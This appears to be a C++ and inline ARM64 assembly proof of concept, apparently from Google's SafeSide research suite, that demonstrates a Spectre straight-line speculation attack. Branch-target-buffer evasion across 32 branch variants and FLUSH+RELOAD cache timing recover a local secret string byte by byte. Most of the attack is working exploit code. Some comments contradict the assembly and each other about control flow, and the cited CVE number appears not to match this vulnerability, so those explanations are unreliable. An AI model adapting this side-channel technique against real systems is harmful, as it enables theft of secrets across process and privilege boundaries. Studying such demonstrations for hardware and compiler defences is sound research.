/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

// Spectre SLS -- Straight-Line Speculation via indirect branch on ARM64.
//
// Demonstrates that after an unconditional indirect branch (BR instruction),
// the CPU may speculatively execute instructions placed immediately after the
// branch in memory ("straight-line"), before the branch target is resolved.
//
// This is related to CVE-2020-1384. The attack works as follows:
//
//   1. We place a "speculative gadget" (load secret + cache oracle access)
//      immediately after a BR instruction in memory.
//
//   2. The BR target address is loaded from a cache-missed memory location,
//      so the CPU cannot resolve the branch target immediately.
//
//   3. While waiting for the target address, the CPU fetches and speculatively
//      executes the instructions that follow the BR in program order -- the
//      straight-line path -- even though architecturally the BR will redirect
//      execution to a completely different location.
//
//   4. The speculatively executed gadget loads a secret byte and uses it to
//      index into a cache side-channel oracle (FLUSH+RELOAD).
//
//   5. When the BR target finally resolves, the speculative results are
//      discarded -- but the cache state persists as a side effect.
//
//   6. We measure cache access latencies to determine which oracle entry was
//      touched speculatively, recovering the secret byte.
//
// BTB DEFEAT STRATEGY:
// The Branch Target Buffer (BTB) learns the target of each BR instruction
// after the first execution. If we used a single BR, the BTB would predict
// the correct target (SafeTarget) on subsequent calls, preventing straight-
// line speculation. To defeat this, we use N=32 variants of the BR+payload
// sequence, each at a unique PC. Each run selects a different variant via
// (run % N), ensuring the BTB has never seen that BR's PC before. This
// forces a BTB miss on every call, triggering straight-line speculation.
//
// PLATFORM NOTES:
// This demo targets ARM64 (AArch64) only. It requires an out-of-order CPU
// that performs straight-line speculation after indirect branches. Results
// may vary across microarchitectures.

#include "compiler_specifics.h"

#if !SAFESIDE_ARM64
#  error Unsupported architecture. ARM64 required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "utils.h"

// Number of BR+payload variants. Each variant has its BR at a unique PC,
// so the BTB cannot learn the target across variants. 32 was chosen
// empirically -- enough to defeat most BTB implementations while keeping
// the code compact.
constexpr int kVariantCount = 32;

// SafeTarget: the architectural destination of the indirect branch.
// This function is intentionally empty. When BR jumps here, the RET
// instruction uses x30 (link register), which still holds the return
// address to SlsGadget's caller. This means control returns correctly
// without any stack corruption, as long as SlsGadget is a leaf function
// (no stack frame of its own).
SAFESIDE_NEVER_INLINE
static void SafeTarget() {
  // Intentionally empty -- returns via x30 set by the original caller.
}

// Global function pointer: the branch target stored in memory.
// We flush this from cache before each BR so that loading the target
// address is slow (~100+ cycles), creating a window during which the
// CPU speculatively executes the straight-line gadget.
static void (*g_branch_target)(void) = SafeTarget;

// SlsGadget: the core of the SLS attack with multi-PC variants.
//
// Memory layout (each variant is exactly 32 bytes = 8 instructions):
//
//   variant[0]:
//     LDR  x0, [g_branch_target]   ; load target (cache miss = slow)
//     BR   x0                      ; indirect branch to SafeTarget
//     LDRB w3, [secret_addr]       ; \
//     ADD  x3, oracle, x3, LSL 12  ;  >-- speculative payload
//     LDRB w3, [x3]                ; /
//     B    exit_label              ; skip remaining variants
//     NOP                          ; padding
//     NOP                          ; padding
//
//   variant[1]:
//     (same structure, different PC for BR)
//   ...
//   variant[31]:
//     (same structure, different PC for BR)
//
//   exit_label:
//     RET                          ; return to caller
//
// Architecturally, BR redirects to SafeTarget which returns to the caller.
// Speculatively, the CPU executes the three payload instructions straight-line
// before the BR target is known, loading a secret byte into the cache oracle.
//
// This function must remain a leaf function (no calls, no stack frame) so that
// SafeTarget's RET can return directly to our caller with a clean stack.
SAFESIDE_NEVER_INLINE
static void SlsGadget(const char *secret_addr, const void *oracle_base,
                      size_t variant) {
  asm volatile(
      // Compute the address of the selected variant.
      // Each variant is 32 bytes (8 instructions).
      // variant_base = address of label "1f" (start of variant array)
      // target = variant_base + variant * 32
      "adr x4, 1f\n"
      "add x4, x4, %3, lsl 5\n"  // variant * 32
      "br  x4\n"                  // jump to selected variant

      // === Variant array ===
      // 32 copies of the BR+payload sequence, each exactly 32 bytes.
      // The .rept directive generates them at assembly time.
      "1:\n"
      ".rept 32\n"
      // Load the branch target from memory. Because g_branch_target was
      // flushed from cache, this LDR stalls for ~100+ cycles.
      "  ldr x0, %2\n"

      // Indirect branch. The CPU cannot resolve the target until the LDR
      // above completes, so it speculatively fetches and executes the
      // instructions that follow the BR in memory (straight-line).
      "  br  x0\n"

      // === Straight-line speculation payload ===
      // These instructions are speculatively executed before BR resolves.

      // Load the secret byte from private_data into w3 (zero-extended to x3).
      "  ldrb w3, [%0]\n"

      // Compute the oracle address: oracle_base + secret_byte * 4096.
      // Each oracle entry (BigByte) is 4096 bytes to avoid cache prefetching.
      "  add  x3, %1, x3, lsl 12\n"

      // Touch the oracle entry -- this loads it into cache, creating a
      // microarchitectural side effect that survives speculation rollback.
      "  ldrb w3, [x3]\n"

      // Architecturally: skip remaining variants and jump to exit.
      // This B instruction is never reached speculatively (BR redirects),
      // but is needed for correct architectural execution.
      "  b 2f\n"

      // Padding to make each variant exactly 32 bytes (8 instructions).
      "  nop\n"
      "  nop\n"
      ".endr\n"

      // === Exit point ===
      // After SafeTarget's RET, control returns here (via x30 from caller).
      // This label is the target of the B instruction in each variant.
      "2:\n"
      :
      : "r"(secret_addr), "r"(oracle_base), "m"(g_branch_target),
        "r"(variant)
      : "x0", "x3", "x4", "memory");
}

// Leaks private_data[offset] via straight-line speculation after BR.
//
// For each run:
//   1. Flush the cache oracle (all 256 entries)
//   2. Flush g_branch_target from cache to delay BR resolution
//   3. Execute SlsGadget with a unique variant index (run % 32)
//      - The variant's BR is at a PC the BTB has never seen
//      - BTB miss -> straight-line speculation of the payload
//   4. Measure oracle latencies to identify which entry was touched
//   5. Accumulate scores across runs until one byte dominates
static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // Flush the branch target pointer from cache. This makes the LDR in
    // SlsGadget slow, giving the CPU time to speculatively execute the
    // straight-line payload before the BR target address is known.
    FlushDataCacheLine(&g_branch_target);
    MemoryAndSpeculationBarrier();

    // Execute the SLS gadget with a variant index that cycles through
    // all 32 variants. Each variant has its BR at a unique PC, so the
    // BTB cannot predict the target -- it always misses and speculates
    // straight-line.
    size_t variant = run % kVariantCount;
    SlsGadget(&private_data[offset], sidechannel.GetOracle().data(), variant);

    // The secret was only accessed speculatively -- there is no architectural
    // cache hit to use as a reference. AddHitAndRecomputeScores injects an
    // artificial architectural hit and checks which oracle entry was accessed.
    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    // Leak each byte of private_data. The only architectural memory accesses
    // are to valid bytes in public_data and local auxiliary structures --
    // private_data is never accessed in the C++ execution model.
    std::cout << LeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
